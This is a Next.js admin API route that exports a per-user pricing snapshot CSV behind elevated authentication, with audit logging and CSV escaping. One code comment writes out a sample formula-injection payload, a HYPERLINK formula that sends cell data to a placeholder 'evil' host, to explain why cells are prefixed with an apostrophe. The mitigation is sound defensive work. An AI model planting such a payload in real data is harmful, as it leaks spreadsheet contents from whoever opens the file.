import { headers as nextHeaders } from "next/headers";
import { NextResponse } from "next/server";
import { selectPricingSnapshotForCsvExport } from "@/db/queries/admin-pricing-snapshot-csv";
import { logCsvExport } from "@/lib/admin/actions";
import { requireAdminMutation } from "@/lib/admin/guard";
import { clientIpFromHeaders } from "@/lib/admin/ip-allowlist";
import { AppError, apiHandler, ErrorCode } from "@/lib/errors";

/**
 * Per-user cost snapshot CSV. Includes email + storage + recording counts +
 * server-tx counts. Treated as a MUTATION-class action (requires the tighter
 * 10-minute elevated-cookie window) because it lifts bulk PII off the system
 * in a single download.
 *
 * POST + JSON body (`{ reason }`) so the audit reason never lands in URL
 * query string -- access logs / browser history / referer headers would
 * otherwise capture it. Logged to admin_action_log via logCsvExport.
 */
export const POST = apiHandler(async (request: Request) => {
    const admin = await requireAdminMutation({
        route: "/api/admin/pricing-snapshot/export.csv",
        method: "POST",
    });

    const parsed = await request.json().catch(() => null);
    const body =
        parsed && typeof parsed === "object"
            ? (parsed as Record<string, unknown>)
            : {};
    const reason = typeof body.reason === "string" ? body.reason : "";
    if (reason.trim().length < 4) {
        throw new AppError(
            ErrorCode.MISSING_REQUIRED_FIELD,
            "reason required (min 4 chars)",
            400,
            { field: "reason" },
        );
    }

    const rows = await selectPricingSnapshotForCsvExport();

    await logCsvExport(
        {
            adminUserId: admin.user.id,
            adminUserEmail: admin.user.email,
            ip: clientIpFromHeaders(await nextHeaders()),
            reason,
        },
        "pricing_snapshot",
        rows.length,
    );

    const header = [
        "email",
        "created_at",
        "suspended",
        "recording_count",
        "storage_bytes",
        "server_tx_30d",
    ].join(",");

    const csvEscape = (v: unknown): string => {
        if (v === null || v === undefined) return "";
        let s = String(v);
        // CSV-injection defense: spreadsheet apps (Excel, Numbers, Sheets)
        // will evaluate cell contents as a formula when they start with one
        // of these characters. A user can register with an email like
        // `=HYPERLINK("http://evil/?"&A1)` which would then run as the
        // admin who opens the export. Prefix with a single apostrophe;
        // spreadsheets render the value as text without showing the quote.
        // OWASP "CSV injection" / formula-injection mitigation.
        if (/^[=+\-@\t\r]/.test(s)) {
            s = `'${s}`;
        }
        // CSV quoting: wrap in quotes if it contains comma/quote/newline.
        if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
        return s;
    };

    const lines = rows.map((r) =>
        [
            csvEscape(r.email),
            csvEscape(new Date(r.created_at).toISOString()),
            csvEscape(r.suspended_at ? "true" : "false"),
            csvEscape(r.recording_count),
            csvEscape(r.storage_bytes),
            csvEscape(r.server_tx_30d),
        ].join(","),
    );

    const csv = `${header}\n${lines.join("\n")}\n`;
    const stamp = new Date().toISOString().replace(/[:.]/g, "-");
    return new NextResponse(csv, {
        headers: {
            "Content-Type": "text/csv; charset=utf-8",
            "Content-Disposition": `attachment; filename="mesynx-ai-pricing-snapshot-${stamp}.csv"`,
            // Don't let intermediaries cache PII.
            "Cache-Control": "no-store, private",
        },
    });
});
